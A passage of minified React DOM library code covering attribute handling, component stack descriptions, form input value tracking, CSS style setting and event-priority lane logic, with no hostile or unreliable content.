        function l(e, t) {
          c(e, t), c(e + "Capture", t);
        }
        function c(e, t) {
          for (a[e] = t, e = 0; e < t.length; e++) s.add(t[e]);
        }
        var u = !(
            "undefined" === typeof window ||
            "undefined" === typeof window.document ||
            "undefined" === typeof window.document.createElement
          ),
          f = Object.prototype.hasOwnProperty,
          h =
            /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
          d = {},
          p = {};
        function g(e, t, n, r, i, o, s) {
          (this.acceptsBooleans = 2 === t || 3 === t || 4 === t),
            (this.attributeName = r),
            (this.attributeNamespace = i),
            (this.mustUseProperty = n),
            (this.propertyName = e),
            (this.type = t),
            (this.sanitizeURL = o),
            (this.removeEmptyString = s);
        }
        var y = {};
        "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style"
          .split(" ")
          .forEach(function (e) {
            y[e] = new g(e, 0, !1, e, null, !1, !1);
          }),
          [
            ["acceptCharset", "accept-charset"],
            ["className", "class"],
            ["htmlFor", "for"],
            ["httpEquiv", "http-equiv"],
          ].forEach(function (e) {
            var t = e[0];
            y[t] = new g(t, 1, !1, e[1], null, !1, !1);
          }),
          ["contentEditable", "draggable", "spellCheck", "value"].forEach(
            function (e) {
              y[e] = new g(e, 2, !1, e.toLowerCase(), null, !1, !1);
            }
          ),
          [
            "autoReverse",
            "externalResourcesRequired",
            "focusable",
            "preserveAlpha",
          ].forEach(function (e) {
            y[e] = new g(e, 2, !1, e, null, !1, !1);
          }),
          "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope"
            .split(" ")
            .forEach(function (e) {
              y[e] = new g(e, 3, !1, e.toLowerCase(), null, !1, !1);
            }),
          ["checked", "multiple", "muted", "selected"].forEach(function (e) {
            y[e] = new g(e, 3, !0, e, null, !1, !1);
          }),
          ["capture", "download"].forEach(function (e) {
            y[e] = new g(e, 4, !1, e, null, !1, !1);
          }),
          ["cols", "rows", "size", "span"].forEach(function (e) {
            y[e] = new g(e, 6, !1, e, null, !1, !1);
          }),
          ["rowSpan", "start"].forEach(function (e) {
            y[e] = new g(e, 5, !1, e.toLowerCase(), null, !1, !1);
          });
        var w = /[\-:]([a-z])/g;
        function m(e) {
          return e[1].toUpperCase();
        }
        function b(e, t, n, r) {
          var i = y.hasOwnProperty(t) ? y[t] : null;
          (null !== i
            ? 0 !== i.type
            : r ||
              !(2 < t.length) ||
              ("o" !== t[0] && "O" !== t[0]) ||
              ("n" !== t[1] && "N" !== t[1])) &&
            ((function (e, t, n, r) {
              if (
                null === t ||
                "undefined" === typeof t ||
                (function (e, t, n, r) {
                  if (null !== n && 0 === n.type) return !1;
                  switch (typeof t) {
                    case "function":
                    case "symbol":
                      return !0;
                    case "boolean":
                      return (
                        !r &&
                        (null !== n
                          ? !n.acceptsBooleans
                          : "data-" !== (e = e.toLowerCase().slice(0, 5)) &&
                            "aria-" !== e)
                      );
                    default:
                      return !1;
                  }
                })(e, t, n, r)
              )
                return !0;
              if (r) return !1;
              if (null !== n)
                switch (n.type) {
                  case 3:
                    return !t;
                  case 4:
                    return !1 === t;
                  case 5:
                    return isNaN(t);
                  case 6:
                    return isNaN(t) || 1 > t;
                }
              return !1;
            })(t, n, i, r) && (n = null),
            r || null === i
              ? (function (e) {
                  return (
                    !!f.call(p, e) ||
                    (!f.call(d, e) &&
                      (h.test(e) ? (p[e] = !0) : ((d[e] = !0), !1)))
                  );
                })(t) &&
                (null === n ? e.removeAttribute(t) : e.setAttribute(t, "" + n))
              : i.mustUseProperty
              ? (e[i.propertyName] = null === n ? 3 !== i.type && "" : n)
              : ((t = i.attributeName),
                (r = i.attributeNamespace),
                null === n
                  ? e.removeAttribute(t)
                  : ((n =
                      3 === (i = i.type) || (4 === i && !0 === n)
                        ? ""
                        : "" + n),
                    r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))));
        }
        "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height"
          .split(" ")
          .forEach(function (e) {
            var t = e.replace(w, m);
            y[t] = new g(t, 1, !1, e, null, !1, !1);
          }),
          "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type"
            .split(" ")
            .forEach(function (e) {
              var t = e.replace(w, m);
              y[t] = new g(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1);
            }),
          ["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
            var t = e.replace(w, m);
            y[t] = new g(
              t,
              1,
              !1,
              e,
              "http://www.w3.org/XML/1998/namespace",
              !1,
              !1
            );
          }),
          ["tabIndex", "crossOrigin"].forEach(function (e) {
            y[e] = new g(e, 1, !1, e.toLowerCase(), null, !1, !1);
          }),
          (y.xlinkHref = new g(
            "xlinkHref",
            1,
            !1,
            "xlink:href",
            "http://www.w3.org/1999/xlink",
            !0,
            !1
          )),
          ["src", "href", "action", "formAction"].forEach(function (e) {
            y[e] = new g(e, 1, !1, e.toLowerCase(), null, !0, !0);
          });
        var v = r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
          E = Symbol.for("react.element"),
          S = Symbol.for("react.portal"),
          x = Symbol.for("react.fragment"),
          A = Symbol.for("react.strict_mode"),
          k = Symbol.for("react.profiler"),
          T = Symbol.for("react.provider"),
          C = Symbol.for("react.context"),
          I = Symbol.for("react.forward_ref"),
          O = Symbol.for("react.suspense"),
          B = Symbol.for("react.suspense_list"),
          P = Symbol.for("react.memo"),
          _ = Symbol.for("react.lazy");
        Symbol.for("react.scope"), Symbol.for("react.debug_trace_mode");
        var U = Symbol.for("react.offscreen");
        Symbol.for("react.legacy_hidden"),
          Symbol.for("react.cache"),
          Symbol.for("react.tracing_marker");
        var N = Symbol.iterator;
        function R(e) {
          return null === e || "object" !== typeof e
            ? null
            : "function" === typeof (e = (N && e[N]) || e["@@iterator"])
            ? e
            : null;
        }
        var L,
          $ = Object.assign;
        function H(e) {
          if (void 0 === L)
            try {
              throw Error();
            } catch (n) {
              var t = n.stack.trim().match(/\n( *(at )?)/);
              L = (t && t[1]) || "";
            }
          return "\n" + L + e;
        }
        var D = !1;
        function M(e, t) {
          if (!e || D) return "";
          D = !0;
          var n = Error.prepareStackTrace;
          Error.prepareStackTrace = void 0;
          try {
            if (t)
              if (
                ((t = function () {
                  throw Error();
                }),
                Object.defineProperty(t.prototype, "props", {
                  set: function () {
                    throw Error();
                  },
                }),
                "object" === typeof Reflect && Reflect.construct)
              ) {
                try {
                  Reflect.construct(t, []);
                } catch (c) {
                  var r = c;
                }
                Reflect.construct(e, [], t);
              } else {
                try {
                  t.call();
                } catch (c) {
                  r = c;
                }
                e.call(t.prototype);
              }
            else {
              try {
                throw Error();
              } catch (c) {
                r = c;
              }
              e();
            }
          } catch (c) {
            if (c && r && "string" === typeof c.stack) {
              for (
                var i = c.stack.split("\n"),
                  o = r.stack.split("\n"),
                  s = i.length - 1,
                  a = o.length - 1;
                1 <= s && 0 <= a && i[s] !== o[a];

              )
                a--;
              for (; 1 <= s && 0 <= a; s--, a--)
                if (i[s] !== o[a]) {
                  if (1 !== s || 1 !== a)
                    do {
                      if ((s--, 0 > --a || i[s] !== o[a])) {
                        var l = "\n" + i[s].replace(" at new ", " at ");
                        return (
                          e.displayName &&
                            l.includes("<anonymous>") &&
                            (l = l.replace("<anonymous>", e.displayName)),
                          l
                        );
                      }
                    } while (1 <= s && 0 <= a);
                  break;
                }
            }
          } finally {
            (D = !1), (Error.prepareStackTrace = n);
          }
          return (e = e ? e.displayName || e.name : "") ? H(e) : "";
        }
        function F(e) {
          switch (e.tag) {
            case 5:
              return H(e.type);
            case 16:
              return H("Lazy");
            case 13:
              return H("Suspense");
            case 19:
              return H("SuspenseList");
            case 0:
            case 2:
            case 15:
              return (e = M(e.type, !1));
            case 11:
              return (e = M(e.type.render, !1));
            case 1:
              return (e = M(e.type, !0));
            default:
              return "";
          }
        }
        function j(e) {
          if (null == e) return null;
          if ("function" === typeof e) return e.displayName || e.name || null;
          if ("string" === typeof e) return e;
          switch (e) {
            case x:
              return "Fragment";
            case S:
              return "Portal";
            case k:
              return "Profiler";
            case A:
              return "StrictMode";
            case O:
              return "Suspense";
            case B:
              return "SuspenseList";
          }
          if ("object" === typeof e)
            switch (e.$$typeof) {
              case C:
                return (e.displayName || "Context") + ".Consumer";
              case T:
                return (e._context.displayName || "Context") + ".Provider";
              case I:
                var t = e.render;
                return (
                  (e = e.displayName) ||
                    (e =
                      "" !== (e = t.displayName || t.name || "")
                        ? "ForwardRef(" + e + ")"
                        : "ForwardRef"),
                  e
                );
              case P:
                return null !== (t = e.displayName || null)
                  ? t
                  : j(e.type) || "Memo";
              case _:
                (t = e._payload), (e = e._init);
                try {
                  return j(e(t));
                } catch (n) {}
            }
          return null;
        }
        function z(e) {
          var t = e.type;
          switch (e.tag) {
            case 24:
              return "Cache";
            case 9:
              return (t.displayName || "Context") + ".Consumer";
            case 10:
              return (t._context.displayName || "Context") + ".Provider";
            case 18:
              return "DehydratedFragment";
            case 11:
              return (
                (e = (e = t.render).displayName || e.name || ""),
                t.displayName ||
                  ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef")
              );
            case 7:
              return "Fragment";
            case 5:
              return t;
            case 4:
              return "Portal";
            case 3:
              return "Root";
            case 6:
              return "Text";
            case 16:
              return j(t);
            case 8:
              return t === A ? "StrictMode" : "Mode";
            case 22:
              return "Offscreen";
            case 12:
              return "Profiler";
            case 21:
              return "Scope";
            case 13:
              return "Suspense";
            case 19:
              return "SuspenseList";
            case 25:
              return "TracingMarker";
            case 1:
            case 0:
            case 17:
            case 2:
            case 14:
            case 15:
              if ("function" === typeof t)
                return t.displayName || t.name || null;
              if ("string" === typeof t) return t;
          }
          return null;
        }
        function K(e) {
          switch (typeof e) {
            case "boolean":
            case "number":
            case "string":
            case "undefined":
            case "object":
              return e;
            default:
              return "";
          }
        }
        function W(e) {
          var t = e.type;
          return (
            (e = e.nodeName) &&
            "input" === e.toLowerCase() &&
            ("checkbox" === t || "radio" === t)
          );
        }
        function V(e) {
          e._valueTracker ||
            (e._valueTracker = (function (e) {
              var t = W(e) ? "checked" : "value",
                n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
                r = "" + e[t];
              if (
                !e.hasOwnProperty(t) &&
                "undefined" !== typeof n &&
                "function" === typeof n.get &&
                "function" === typeof n.set
              ) {
                var i = n.get,
                  o = n.set;
                return (
                  Object.defineProperty(e, t, {
                    configurable: !0,
                    get: function () {
                      return i.call(this);
                    },
                    set: function (e) {
                      (r = "" + e), o.call(this, e);
                    },
                  }),
                  Object.defineProperty(e, t, { enumerable: n.enumerable }),
                  {
                    getValue: function () {
                      return r;
                    },
                    setValue: function (e) {
                      r = "" + e;
                    },
                    stopTracking: function () {
                      (e._valueTracker = null), delete e[t];
                    },
                  }
                );
              }
            })(e));
        }
        function q(e) {
          if (!e) return !1;
          var t = e._valueTracker;
          if (!t) return !0;
          var n = t.getValue(),
            r = "";
          return (
            e && (r = W(e) ? (e.checked ? "true" : "false") : e.value),
            (e = r) !== n && (t.setValue(e), !0)
          );
        }
        function G(e) {
          if (
            "undefined" ===
            typeof (e =
              e || ("undefined" !== typeof document ? document : void 0))
          )
            return null;
          try {
            return e.activeElement || e.body;
          } catch (t) {
            return e.body;
          }
        }
        function Y(e, t) {
          var n = t.checked;
          return $({}, t, {
            defaultChecked: void 0,
            defaultValue: void 0,
            value: void 0,
            checked: null != n ? n : e._wrapperState.initialChecked,
          });
        }
        function Z(e, t) {
          var n = null == t.defaultValue ? "" : t.defaultValue,
            r = null != t.checked ? t.checked : t.defaultChecked;
          (n = K(null != t.value ? t.value : n)),
            (e._wrapperState = {
              initialChecked: r,
              initialValue: n,
              controlled:
                "checkbox" === t.type || "radio" === t.type
                  ? null != t.checked
                  : null != t.value,
            });
        }
        function J(e, t) {
          null != (t = t.checked) && b(e, "checked", t, !1);
        }
        function X(e, t) {
          J(e, t);
          var n = K(t.value),
            r = t.type;
          if (null != n)
            "number" === r
              ? ((0 === n && "" === e.value) || e.value != n) &&
                (e.value = "" + n)
              : e.value !== "" + n && (e.value = "" + n);
          else if ("submit" === r || "reset" === r)
            return void e.removeAttribute("value");
          t.hasOwnProperty("value")
            ? ee(e, t.type, n)
            : t.hasOwnProperty("defaultValue") &&
              ee(e, t.type, K(t.defaultValue)),
            null == t.checked &&
              null != t.defaultChecked &&
              (e.defaultChecked = !!t.defaultChecked);
        }
        function Q(e, t, n) {
          if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
            var r = t.type;
            if (
              !(
                ("submit" !== r && "reset" !== r) ||
                (void 0 !== t.value && null !== t.value)
              )
            )
              return;
            (t = "" + e._wrapperState.initialValue),
              n || t === e.value || (e.value = t),
              (e.defaultValue = t);
          }
          "" !== (n = e.name) && (e.name = ""),
            (e.defaultChecked = !!e._wrapperState.initialChecked),
            "" !== n && (e.name = n);
        }
        function ee(e, t, n) {
          ("number" === t && G(e.ownerDocument) === e) ||
            (null == n
              ? (e.defaultValue = "" + e._wrapperState.initialValue)
              : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
        }
        var te = Array.isArray;
        function ne(e, t, n, r) {
          if (((e = e.options), t)) {
            t = {};
            for (var i = 0; i < n.length; i++) t["$" + n[i]] = !0;
            for (n = 0; n < e.length; n++)
              (i = t.hasOwnProperty("$" + e[n].value)),
                e[n].selected !== i && (e[n].selected = i),
                i && r && (e[n].defaultSelected = !0);
          } else {
            for (n = "" + K(n), t = null, i = 0; i < e.length; i++) {
              if (e[i].value === n)
                return (
                  (e[i].selected = !0), void (r && (e[i].defaultSelected = !0))
                );
              null !== t || e[i].disabled || (t = e[i]);
            }
            null !== t && (t.selected = !0);
          }
        }
        function re(e, t) {
          if (null != t.dangerouslySetInnerHTML) throw Error(o(91));
          return $({}, t, {
            value: void 0,
            defaultValue: void 0,
            children: "" + e._wrapperState.initialValue,
          });
        }
        function ie(e, t) {
          var n = t.value;
          if (null == n) {
            if (((n = t.children), (t = t.defaultValue), null != n)) {
              if (null != t) throw Error(o(92));
              if (te(n)) {
                if (1 < n.length) throw Error(o(93));
                n = n[0];
              }
              t = n;
            }
            null == t && (t = ""), (n = t);
          }
          e._wrapperState = { initialValue: K(n) };
        }
        function oe(e, t) {
          var n = K(t.value),
            r = K(t.defaultValue);
          null != n &&
            ((n = "" + n) !== e.value && (e.value = n),
            null == t.defaultValue &&
              e.defaultValue !== n &&
              (e.defaultValue = n)),
            null != r && (e.defaultValue = "" + r);
        }
        function se(e) {
          var t = e.textContent;
          t === e._wrapperState.initialValue &&
            "" !== t &&
            null !== t &&
            (e.value = t);
        }
        function ae(e) {
          switch (e) {
            case "svg":
              return "http://www.w3.org/2000/svg";
            case "math":
              return "http://www.w3.org/1998/Math/MathML";
            default:
              return "http://www.w3.org/1999/xhtml";
          }
        }
        function le(e, t) {
          return null == e || "http://www.w3.org/1999/xhtml" === e
            ? ae(t)
            : "http://www.w3.org/2000/svg" === e && "foreignObject" === t
            ? "http://www.w3.org/1999/xhtml"
            : e;
        }
        var ce,
          ue,
          fe =
            ((ue = function (e, t) {
              if (
                "http://www.w3.org/2000/svg" !== e.namespaceURI ||
                "innerHTML" in e
              )
                e.innerHTML = t;
              else {
                for (
                  (ce = ce || document.createElement("div")).innerHTML =
                    "<svg>" + t.valueOf().toString() + "</svg>",
                    t = ce.firstChild;
                  e.firstChild;

                )
                  e.removeChild(e.firstChild);
                for (; t.firstChild; ) e.appendChild(t.firstChild);
              }
            }),
            "undefined" !== typeof MSApp && MSApp.execUnsafeLocalFunction
              ? function (e, t, n, r) {
                  MSApp.execUnsafeLocalFunction(function () {
                    return ue(e, t);
                  });
                }
              : ue);
        function he(e, t) {
          if (t) {
            var n = e.firstChild;
            if (n && n === e.lastChild && 3 === n.nodeType)
              return void (n.nodeValue = t);
          }
          e.textContent = t;
        }
        var de = {
            animationIterationCount: !0,
            aspectRatio: !0,
            borderImageOutset: !0,
            borderImageSlice: !0,
            borderImageWidth: !0,
            boxFlex: !0,
            boxFlexGroup: !0,
            boxOrdinalGroup: !0,
            columnCount: !0,
            columns: !0,
            flex: !0,
            flexGrow: !0,
            flexPositive: !0,
            flexShrink: !0,
            flexNegative: !0,
            flexOrder: !0,
            gridArea: !0,
            gridRow: !0,
            gridRowEnd: !0,
            gridRowSpan: !0,
            gridRowStart: !0,
            gridColumn: !0,
            gridColumnEnd: !0,
            gridColumnSpan: !0,
            gridColumnStart: !0,
            fontWeight: !0,
            lineClamp: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            tabSize: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0,
            fillOpacity: !0,
            floodOpacity: !0,
            stopOpacity: !0,
            strokeDasharray: !0,
            strokeDashoffset: !0,
            strokeMiterlimit: !0,
            strokeOpacity: !0,
            strokeWidth: !0,
          },
          pe = ["Webkit", "ms", "Moz", "O"];
        function ge(e, t, n) {
          return null == t || "boolean" === typeof t || "" === t
            ? ""
            : n ||
              "number" !== typeof t ||
              0 === t ||
              (de.hasOwnProperty(e) && de[e])
            ? ("" + t).trim()
            : t + "px";
        }
        function ye(e, t) {
          for (var n in ((e = e.style), t))
            if (t.hasOwnProperty(n)) {
              var r = 0 === n.indexOf("--"),
                i = ge(n, t[n], r);
              "float" === n && (n = "cssFloat"),
                r ? e.setProperty(n, i) : (e[n] = i);
            }
        }
        Object.keys(de).forEach(function (e) {
          pe.forEach(function (t) {
            (t = t + e.charAt(0).toUpperCase() + e.substring(1)),
              (de[t] = de[e]);
          });
        });
        var we = $(
          { menuitem: !0 },
          {
            area: !0,
            base: !0,
            br: !0,
            col: !0,
            embed: !0,
            hr: !0,
            img: !0,
            input: !0,
            keygen: !0,
            link: !0,
            meta: !0,
            param: !0,
            source: !0,
            track: !0,
            wbr: !0,
          }
        );
        function me(e, t) {
          if (t) {
            if (
              we[e] &&
              (null != t.children || null != t.dangerouslySetInnerHTML)
            )
              throw Error(o(137, e));
            if (null != t.dangerouslySetInnerHTML) {
              if (null != t.children) throw Error(o(60));
              if (
                "object" !== typeof t.dangerouslySetInnerHTML ||
                !("__html" in t.dangerouslySetInnerHTML)
              )
                throw Error(o(61));
            }
            if (null != t.style && "object" !== typeof t.style)
              throw Error(o(62));
          }
        }
        function be(e, t) {
          if (-1 === e.indexOf("-")) return "string" === typeof t.is;
          switch (e) {
            case "annotation-xml":
            case "color-profile":
            case "font-face":
            case "font-face-src":
            case "font-face-uri":
            case "font-face-format":
            case "font-face-name":
            case "missing-glyph":
              return !1;
            default:
              return !0;
          }
        }
        var ve = null;
        function Ee(e) {
          return (
            (e = e.target || e.srcElement || window).correspondingUseElement &&
              (e = e.correspondingUseElement),
            3 === e.nodeType ? e.parentNode : e
          );
        }
        var Se = null,
          xe = null,
          Ae = null;
        function ke(e) {
          if ((e = bi(e))) {
            if ("function" !== typeof Se) throw Error(o(280));
            var t = e.stateNode;
            t && ((t = Ei(t)), Se(e.stateNode, e.type, t));
          }
        }
        function Te(e) {
          xe ? (Ae ? Ae.push(e) : (Ae = [e])) : (xe = e);
        }
        function Ce() {
          if (xe) {
            var e = xe,
              t = Ae;
            if (((Ae = xe = null), ke(e), t))
              for (e = 0; e < t.length; e++) ke(t[e]);
          }
        }
        function Ie(e, t) {
          return e(t);
        }
        function Oe() {}
        var Be = !1;
        function Pe(e, t, n) {
          if (Be) return e(t, n);
          Be = !0;
          try {
            return Ie(e, t, n);
          } finally {
            (Be = !1), (null !== xe || null !== Ae) && (Oe(), Ce());
          }
        }
        function _e(e, t) {
          var n = e.stateNode;
          if (null === n) return null;
          var r = Ei(n);
          if (null === r) return null;
          n = r[t];
          e: switch (t) {
            case "onClick":
            case "onClickCapture":
            case "onDoubleClick":
            case "onDoubleClickCapture":
            case "onMouseDown":
            case "onMouseDownCapture":
            case "onMouseMove":
            case "onMouseMoveCapture":
            case "onMouseUp":
            case "onMouseUpCapture":
            case "onMouseEnter":
              (r = !r.disabled) ||
                (r = !(
                  "button" === (e = e.type) ||
                  "input" === e ||
                  "select" === e ||
                  "textarea" === e
                )),
                (e = !r);
              break e;
            default:
              e = !1;
          }
          if (e) return null;
          if (n && "function" !== typeof n) throw Error(o(231, t, typeof n));
          return n;
        }
        var Ue = !1;
        if (u)
          try {
            var Ne = {};
            Object.defineProperty(Ne, "passive", {
              get: function () {
                Ue = !0;
              },
            }),
              window.addEventListener("test", Ne, Ne),
              window.removeEventListener("test", Ne, Ne);
          } catch (ue) {
            Ue = !1;
          }
        function Re(e, t, n, r, i, o, s, a, l) {
          var c = Array.prototype.slice.call(arguments, 3);
          try {
            t.apply(n, c);
          } catch (u) {
            this.onError(u);
          }
        }
        var Le = !1,
          $e = null,
          He = !1,
          De = null,
          Me = {
            onError: function (e) {
              (Le = !0), ($e = e);
            },
          };
        function Fe(e, t, n, r, i, o, s, a, l) {
          (Le = !1), ($e = null), Re.apply(Me, arguments);
        }
        function je(e) {
          var t = e,
            n = e;
          if (e.alternate) for (; t.return; ) t = t.return;
          else {
            e = t;
            do {
              0 !== (4098 & (t = e).flags) && (n = t.return), (e = t.return);
            } while (e);
          }
          return 3 === t.tag ? n : null;
        }
        function ze(e) {
          if (13 === e.tag) {
            var t = e.memoizedState;
            if (
              (null === t &&
                null !== (e = e.alternate) &&
                (t = e.memoizedState),
              null !== t)
            )
              return t.dehydrated;
          }
          return null;
        }
        function Ke(e) {
          if (je(e) !== e) throw Error(o(188));
        }
        function We(e) {
          return null !==
            (e = (function (e) {
              var t = e.alternate;
              if (!t) {
                if (null === (t = je(e))) throw Error(o(188));
                return t !== e ? null : e;
              }
              for (var n = e, r = t; ; ) {
                var i = n.return;
                if (null === i) break;
                var s = i.alternate;
                if (null === s) {
                  if (null !== (r = i.return)) {
                    n = r;
                    continue;
                  }
                  break;
                }
                if (i.child === s.child) {
                  for (s = i.child; s; ) {
                    if (s === n) return Ke(i), e;
                    if (s === r) return Ke(i), t;
                    s = s.sibling;
                  }
                  throw Error(o(188));
                }
                if (n.return !== r.return) (n = i), (r = s);
                else {
                  for (var a = !1, l = i.child; l; ) {
                    if (l === n) {
                      (a = !0), (n = i), (r = s);
                      break;
                    }
                    if (l === r) {
                      (a = !0), (r = i), (n = s);
                      break;
                    }
                    l = l.sibling;
                  }
                  if (!a) {
                    for (l = s.child; l; ) {
                      if (l === n) {
                        (a = !0), (n = s), (r = i);
                        break;
                      }
                      if (l === r) {
                        (a = !0), (r = s), (n = i);
                        break;
                      }
                      l = l.sibling;
                    }
                    if (!a) throw Error(o(189));
                  }
                }
                if (n.alternate !== r) throw Error(o(190));
              }
              if (3 !== n.tag) throw Error(o(188));
              return n.stateNode.current === n ? e : t;
            })(e))
            ? Ve(e)
            : null;
        }
        function Ve(e) {
          if (5 === e.tag || 6 === e.tag) return e;
          for (e = e.child; null !== e; ) {
            var t = Ve(e);
            if (null !== t) return t;
            e = e.sibling;
          }
          return null;
        }
        var qe = i.unstable_scheduleCallback,
          Ge = i.unstable_cancelCallback,
          Ye = i.unstable_shouldYield,
          Ze = i.unstable_requestPaint,
          Je = i.unstable_now,
          Xe = i.unstable_getCurrentPriorityLevel,
          Qe = i.unstable_ImmediatePriority,
          et = i.unstable_UserBlockingPriority,
          tt = i.unstable_NormalPriority,
          nt = i.unstable_LowPriority,
          rt = i.unstable_IdlePriority,
          it = null,
          ot = null;
        var st = Math.clz32
            ? Math.clz32
            : function (e) {
                return (e >>>= 0), 0 === e ? 32 : (31 - ((at(e) / lt) | 0)) | 0;
              },
          at = Math.log,
          lt = Math.LN2;
        var ct = 64,
          ut = 4194304;
        function ft(e) {
          switch (e & -e) {
            case 1:
              return 1;
            case 2:
              return 2;
            case 4:
              return 4;
            case 8:
              return 8;
            case 16:
              return 16;
            case 32:
              return 32;
            case 64:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
              return 4194240 & e;
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
            case 67108864:
              return 130023424 & e;
            case 134217728:
              return 134217728;
            case 268435456:
              return 268435456;
            case 536870912:
              return 536870912;
            case 1073741824:
              return 1073741824;
            default:
              return e;
          }
        }
        function ht(e, t) {
          var n = e.pendingLanes;
          if (0 === n) return 0;
          var r = 0,
            i = e.suspendedLanes,
            o = e.pingedLanes,
            s = 268435455 & n;
          if (0 !== s) {
            var a = s & ~i;
            0 !== a ? (r = ft(a)) : 0 !== (o &= s) && (r = ft(o));
          } else 0 !== (s = n & ~i) ? (r = ft(s)) : 0 !== o && (r = ft(o));
          if (0 === r) return 0;
          if (
            0 !== t &&
            t !== r &&
            0 === (t & i) &&
            ((i = r & -r) >= (o = t & -t) || (16 === i && 0 !== (4194240 & o)))
          )
            return t;
          if ((0 !== (4 & r) && (r |= 16 & n), 0 !== (t = e.entangledLanes)))
            for (e = e.entanglements, t &= r; 0 < t; )
              (i = 1 << (n = 31 - st(t))), (r |= e[n]), (t &= ~i);
          return r;
        }
        function dt(e, t) {
          switch (e) {
            case 1:
            case 2:
            case 4:
              return t + 250;
            case 8:
            case 16:
            case 32:
            case 64:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
              return t + 5e3;
            default:
              return -1;
          }
        }
        function pt(e) {
          return 0 !== (e = -1073741825 & e.pendingLanes)
            ? e
            : 1073741824 & e
            ? 1073741824
            : 0;
        }
        function gt() {
          var e = ct;
          return 0 === (4194240 & (ct <<= 1)) && (ct = 64), e;
        }
        function yt(e) {
          for (var t = [], n = 0; 31 > n; n++) t.push(e);
          return t;
        }
        function wt(e, t, n) {
          (e.pendingLanes |= t),
            536870912 !== t && ((e.suspendedLanes = 0), (e.pingedLanes = 0)),
            ((e = e.eventTimes)[(t = 31 - st(t))] = n);
        }
        function mt(e, t) {
          var n = (e.entangledLanes |= t);
          for (e = e.entanglements; n; ) {
            var r = 31 - st(n),
              i = 1 << r;
            (i & t) | (e[r] & t) && (e[r] |= t), (n &= ~i);
          }
        }
        var bt = 0;
        function vt(e) {
          return 1 < (e &= -e)
            ? 4 < e
              ? 0 !== (268435455 & e)
                ? 16
                : 536870912
              : 4
            : 1;
        }
        var Et,
          St,
          xt,
          At,
          kt,
          Tt = !1,
          Ct = [],
          It = null,
          Ot = null,
          Bt = null,
          Pt = new Map(),
          _t = new Map(),
          Ut = [],
          Nt =
            "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
              " "
            );
        function Rt(e, t) {
          switch (e) {
            case "focusin":
            case "focusout":
              It = null;
              break;
            case "dragenter":
            case "dragleave":
              Ot = null;
              break;
            case "mouseover":
            case "mouseout":
              Bt = null;
              break;
            case "pointerover":
            case "pointerout":
              Pt.delete(t.pointerId);
              break;
            case "gotpointercapture":
            case "lostpointercapture":
              _t.delete(t.pointerId);
          }
        }
        function Lt(e, t, n, r, i, o) {
          return null === e || e.nativeEvent !== o
            ? ((e = {
                blockedOn: t,
                domEventName: n,
                eventSystemFlags: r,
                nativeEvent: o,
                targetContainers: [i],
              }),
              null !== t && null !== (t = bi(t)) && St(t),
              e)
            : ((e.eventSystemFlags |= r),
              (t = e.targetContainers),
              null !== i && -1 === t.indexOf(i) && t.push(i),
              e);
        }
        function $t(e) {
          var t = mi(e.target);
          if (null !== t) {
            var n = je(t);
            if (null !== n)
              if (13 === (t = n.tag)) {
                if (null !== (t = ze(n)))
                  return (
                    (e.blockedOn = t),
                    void kt(e.priority, function () {
                      xt(n);
                    })
                  );
              } else if (
                3 === t &&
                n.stateNode.current.memoizedState.isDehydrated
              )
                return void (e.blockedOn =
                  3 === n.tag ? n.stateNode.containerInfo : null);
          }
          e.blockedOn = null;
        }
        function Ht(e) {
          if (null !== e.blockedOn) return !1;
          for (var t = e.targetContainers; 0 < t.length; ) {
            var n = Yt(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
            if (null !== n)
              return null !== (t = bi(n)) && St(t), (e.blockedOn = n), !1;
